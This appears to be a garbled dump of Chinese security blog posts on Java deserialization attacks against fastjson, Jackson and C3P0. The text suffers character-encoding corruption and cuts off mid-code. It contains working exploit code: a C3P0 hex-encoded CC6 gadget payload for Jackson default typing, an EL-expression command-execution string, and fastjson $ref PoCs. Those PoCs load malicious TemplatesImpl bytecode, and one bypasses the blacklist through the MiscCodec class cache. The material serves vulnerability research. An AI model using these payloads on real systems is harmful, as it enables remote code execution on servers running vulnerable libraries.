<span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">binaryFileToHexString</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytesRead; i++) &#123;</span><br><span class="line">                    hexString.append(String.format(<span class="string">&quot;%02X&quot;</span>, buffer[i]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap1&quot;</span>+GenerateCC6()+<span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;userOverridesAsString&#x27;:&#x27;&quot;</span>+payload+<span class="string">&quot;&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        jackson_C3P0ImplUtils_HEX_CC6.enableDefaultTyping_Test test;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, jackson_C3P0ImplUtils_HEX_CC6.enableDefaultTyping_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fastjsonå†™æ³•å·®ä¸å¤šï¼Œè‡ªå·±æ”¹æ”¹json</p><h2 id="ELè¡¨è¾¾å¼"><a href="#ELè¡¨è¾¾å¼" class="headerlink" title="ELè¡¨è¾¾å¼"></a>ELè¡¨è¾¾å¼</h2><p>æ²¡æœ‰fastjson&#x2F;jacksonæƒ…å†µä¸‹æ‰“ä¸å‡ºç½‘</p><p>ELè¡¨è¾¾å¼å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C3P0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson jackson getter setterå’Œconstructorçš„åŒºåˆ†</title>
      <link href="/2024/10/25/fastjson-jackson-da-qu-fen/"/>
      <url>/2024/10/25/fastjson-jackson-da-qu-fen/</url>
      
        <content type="html"><![CDATA[<p>ä»¥ä¸‹å‡æŒ‡å¯¹jsonçš„ååºåˆ—åŒ–è¿‡ç¨‹</p><h2 id="setter"><a href="#setter" class="headerlink" title="setter"></a>setter</h2><p>fastjsonè°ƒç”¨setterï¼šéå†æ‰€æœ‰æ–¹æ³•ï¼Œæ‰¾å‡ºæ‰€æœ‰æ»¡è¶³setterè¦æ±‚çš„æ–¹æ³•ï¼Œå†æ ¹æ®ä¼ å…¥çš„jsonå»åå°„è°ƒç”¨</p><p>jacksonè°ƒç”¨setterï¼šç›´æ¥å¯¹ä¼ å…¥çš„jsonä¸­çš„å­—æ®µæ‹¼æ¥ä¸Šsetï¼Œç„¶åå»å–setter</p><p>å…¶å®äºŒè€…ä¸€æ ·ï¼Œä½†æ˜¯fastjsonä¸èƒ½è°ƒç”¨ç§æœ‰å’Œå—ä¿æŠ¤setterï¼Œè€Œjacksonå¯ä»¥</p><h2 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h2><p>fastjsonè°ƒç”¨getterï¼š</p><p>1ã€æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰getteræ–¹æ³•ã€‚ä¸”getteræ»¡è¶³ï¼šå‚æ•°é•¿åº¦ä¸º0ï¼Œè¿”å›ç±»å‹æ˜¯å±äºCollection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongçš„ä¸€ç§</p><p>2ã€fastjson&gt;&#x3D;1.2.36 å¯ç”¨<code>$ref</code>è°ƒç”¨getter</p><p>è§£æå‡½æ•°é‡Œæœ‰JSON.toJSONï¼Œè¿˜ä¼šè°ƒç”¨getterï¼ˆparseObjectï¼‰</p><p>jacksonè°ƒç”¨getterï¼š</p><p>1ã€æ²¡æœ‰setterï¼Œæœ‰getteræ–¹æ³•ã€‚å¯ä»¥ç›´æ¥ååºåˆ—åŒ–è°ƒç”¨</p><p>2ã€jackson-databind&amp;core&amp;annotations&gt;&#x3D;2.13.3ï¼Œé€šè¿‡POJONodeè°ƒç”¨getter</p><h2 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h2><p>fastjsonè°ƒç”¨æ„é€ æ–¹æ³•ï¼š</p><ul><li>å¦‚æœå­˜åœ¨æ— å‚æ„é€ æ–¹æ³•ï¼Œåˆ™å°†å…¶ä½œä¸ºæ„é€ æ–¹æ³•</li><li>å¦åˆ™ä½¿ç”¨å‚æ•°æ•°é‡æœ€å¤šä¸”æ’åœ¨æœ€å‰é¢çš„æ„é€ æ–¹æ³•ã€‚</li></ul><p>jacksonè°ƒç”¨æ„é€ æ–¹æ³•ï¼š</p><ul><li>æŒ‰ç…§é¡ºåºï¼Œå¦‚æœæœ‰å‚æ„é€ çš„å‚æ•°èƒ½å¯¹åº”ä¸Šï¼Œç›´æ¥è°ƒç”¨</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson $refè°ƒç”¨getter</title>
      <link href="/2024/10/24/fastjson-ref-diao-yong-getter/"/>
      <url>/2024/10/24/fastjson-ref-diao-yong-getter/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æœ‰åˆ†æåˆ°ï¼Œfastjsonè¯†åˆ«setterçš„æµç¨‹å¦‚ä¸‹ï¼š</p><p>æŒ‰ä»¥ä¸‹é¡ºåºåˆ¤æ–­ï¼Œæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œä¼šè¢«å½“æˆsetterè°ƒç”¨ï¼š</p><ul><li>setå¼€å¤´ï¼Œå‚æ•°é•¿åº¦ä¸º1ï¼Œéstaticï¼Œæ–¹æ³•åæ€»é•¿åº¦å¤§äº3</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰å­—æ®µæ˜¯boolç±»å‹ï¼Œåˆ™ç”¨<code>is</code>åŠ ä¸Šé¦–å­—æ¯å¤§å†™åçš„å­—æ®µå»æŸ¥æ‰¾ï¼ˆæ‰€ä»¥isNameè¿™ç§ä¹Ÿç®—setterï¼‰</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰getteræ–¹æ³•ï¼Œå‚æ•°é•¿åº¦ä¸º0ï¼Œè¿”å›ç±»å‹æ˜¯å±äºCollection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongçš„ä¸€ç§</li></ul><p>é‚£æœ‰æ²¡æœ‰æ›´é€šç”¨çš„è°ƒç”¨getterçš„åŠæ³•å‘¢ï¼Ÿ</p><p>åœ¨Fastjson&gt;&#x3D;1.2.36æ—¶ï¼Œå¯ä»¥ç”¨$refçš„æ–¹å¼è°ƒç”¨ä»»æ„getter</p><h2 id="ref"><a href="#ref" class="headerlink" title="$ref"></a>$ref</h2><p>$refæ˜¯fastjsoné‡Œçš„å¼•ç”¨ï¼Œå¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡</p><table><thead><tr><th>è¯­æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>{â€œ$refâ€:â€$â€}</td><td>å¼•ç”¨æ ¹å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€@â€}</td><td>å¼•ç”¨è‡ªå·±</td></tr><tr><td>{â€œ$refâ€:â€..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€..&#x2F;..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€$.members[0].reportToâ€}</td><td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td></tr></tbody></table><p>å†™ä¸ªTestç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨$refçš„æµ‹è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.yyds.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>$[0]</code>æŒ‡çš„æ˜¯å‰é¢ç”Ÿæˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯Test</p><p>è¿™é‡Œåªæ˜¯æµ‹$refçš„ä½œç”¨ï¼Œå¼€ä¸ªautoTypeæ— æ‰€è°“</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>JSON.parseä¼šè°ƒç”¨handleResovleTask</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160637063.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160637063.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024160637063"></p><p>handleResovleTaskä¼šå–å‡ºrefçš„å†…å®¹ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦ä»¥$å¼€å¤´ï¼Œå¦‚æœæ˜¯ï¼Œä¼šå…ˆè°ƒç”¨compileï¼Œç„¶åeval</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160829609.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160829609.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024160829609"></p><p>compileå°±æ˜¯æ‹¿JSONPathå°è£…äº†ä¸€ä¸‹ï¼Œè·Ÿè¿›åˆ°evalï¼Œevalå…ˆæ˜¯è°ƒç”¨initåˆå§‹åŒ–ï¼Œç„¶åå¾ªç¯segmentsè°ƒç”¨eval</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162005867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162005867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162005867"></p><p>è¿›ä¸€æ­¥æŸ¥çœ‹initï¼Œå‘ç°å¦‚æœpathä¸ä¸º<code>*</code>ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªJSONPathParserï¼Œè°ƒç”¨explainæ¥è§£æè·¯å¾„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162058533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162058533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162058533"></p><p>è·Ÿè¿›åˆ°explainï¼Œè§£æå¤„ç†å¦‚ä¸‹ï¼š</p><ul><li><p>åˆ›å»ºä¸€ä¸ªåˆå§‹å®¹é‡ä¸º8çš„Segmentæ•°ç»„segmentsï¼Œè°ƒç”¨readSegementè¯»å–ä¸‹ä¸€ä¸ªæ®µï¼Œå¦‚æœè¯»åˆ°çš„æ˜¯nullåˆ™é€€å‡ºå¾ªç¯ã€‚</p></li><li><p>å¦‚æœè¯»å–åˆ°çš„æ®µæ˜¯ PropertySegment ä¸”å…¶ propertyName ä¸º â€œ*â€ ä¸” deep ä¸º falseï¼Œåˆ™è·³è¿‡è¯¥æ®µã€‚</p></li></ul><p>å°†è¯»å–åˆ°çš„æ®µæ·»åŠ åˆ°æ•°ç»„ä¸­ï¼Œå¹¶å¢åŠ  level è®¡æ•°å™¨ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162711492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162711492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162711492"></p><p>å…¶ä¸­readSegementä¼šæ ¹æ®<code>.</code>åˆ†å‰²pathï¼Œç«¥è¯åˆšåˆšreadNameå–åˆ°keyå€¼ï¼ˆcmdï¼‰ï¼ŒreadNameé‡Œé¢å°±ä¸€ä¸ªtoString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163356608.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163356608.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163356608"></p><p>æœ€åsegmentså°±åªæœ‰ä¸€ä¸ªcmdï¼Œæ²¡æœ‰å¯¹åº”çš„value</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163608492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163608492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163608492"></p><p>æ¥ç€çœ‹initåçš„segment.evalï¼Œä½¿ç”¨getPropertyValueè·å–valueï¼Œæ€ä¹ˆè·å–çš„å‘¢ï¼Ÿ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163649372.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163649372.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163649372"></p><p>åœ¨getPropertyValueä¸­ï¼Œå› ä¸ºæˆ‘ä»¬çš„Beanæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»ï¼Œä½¿ç”¨äº†getJavaBeanSerializerè·å–åºåˆ—åŒ–å™¨ï¼Œç„¶åè°ƒç”¨getFieldValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163812999.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163812999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163812999"></p><p>è¿™ä¸ªSerializeræ˜¯ä¸€ä¸ªASMSerializerï¼Œå¦‚æœä¹‹å‰çœ‹è¿‡æˆ‘çš„fastjsonåˆ†æï¼Œå°±çŸ¥é“è¿™åé¢çš„æµç¨‹å…¶å®å’ŒJSON.toJSONçš„æµç¨‹ä¸€æ ·äº†</p><p><a href="https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter">https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164904035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164904035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024164904035"></p><p>getFieldValueè¿›ä¸€æ­¥è°ƒç”¨getPropertyValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164951200.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164951200.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024164951200"></p><p>ç„¶åè°ƒç”¨get</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165046197.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165046197.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165046197"></p><p>ç„¶ååå°„æ‰§è¡Œgetter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165125865.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165125865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165125865"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚æœæˆ‘ä»¬è¾“å‡ºparseååºåˆ—åŒ–è§£æåçš„Objectï¼Œå‘ç°<code>&#123;&quot;$ref&quot;:&quot;$[0].cmd&quot;&#125;</code>è§£æåçš„å€¼æ˜¯calcï¼Œè¿™ç§å¼•ç”¨çš„æ–¹å¼ä¸ºäº†è¿”å›valueï¼Œè°ƒç”¨äº†getter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165503636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165503636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165503636"></p><h2 id="ä¸ºä»€ä¹ˆ1-2-35-refä¸èƒ½è§¦å‘"><a href="#ä¸ºä»€ä¹ˆ1-2-35-refä¸èƒ½è§¦å‘" class="headerlink" title="ä¸ºä»€ä¹ˆ1.2.35 $refä¸èƒ½è§¦å‘"></a>ä¸ºä»€ä¹ˆ1.2.35 $refä¸èƒ½è§¦å‘</h2><p>1.2.35çš„DefaultJSONParser.handleResolveTaskä¸æ˜¯ç›´æ¥è°ƒç”¨JSONPath.eval</p><p>è€Œæ˜¯åˆ¤æ–­äº†refValueéœ€è¦ä¸ºJSONObjectç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024170248058.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024170248058.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024170248058"></p><blockquote><p>ä»€ä¹ˆåå‘ä¿®å¤ï¼Ÿ</p></blockquote><h2 id="fastjson-refè°ƒç”¨TemplatesImpl"><a href="#fastjson-refè°ƒç”¨TemplatesImpl" class="headerlink" title="fastjson $refè°ƒç”¨TemplatesImpl"></a>fastjson $refè°ƒç”¨TemplatesImpl</h2><p>æjacksonçš„æ—¶å€™æåˆ°ï¼Œjackson æ²¡æœ‰setterçš„æƒ…å†µä¸‹ä¼šè°ƒç”¨getterï¼Œäºæ˜¯æœ‰TemplatesImplé“¾ã€‚æˆ‘ä¸€æ‹å¤§è…¿è¯´é‚£fastjsoné€šè¿‡$refä¹Ÿå¯ä»¥å•Šï¼POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Id_MINIMAL_Class_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;[&#123;&#x27;@type&#x27;:&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;test&#x27;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$[0].outputProperties\&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        JSON.parse(jsonInput);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°1.2.36æ—©å°±æŠŠTemplatesImplåŠ å…¥é»‘åå•äº†ï¼Œè€Œ&gt;&#x3D;1.2.36æ‰èƒ½é€šè¿‡$refè°ƒç”¨getter</p><p>é‚£æˆ‘å¼ºè¡Œç”¨MiscCodecç¼“å­˜ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Id_MINIMAL_Class_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;,&#123;&#x27;@type&#x27;:&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;test&#x27;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$[1].outputProperties\&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        JSON.parse(jsonInput);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 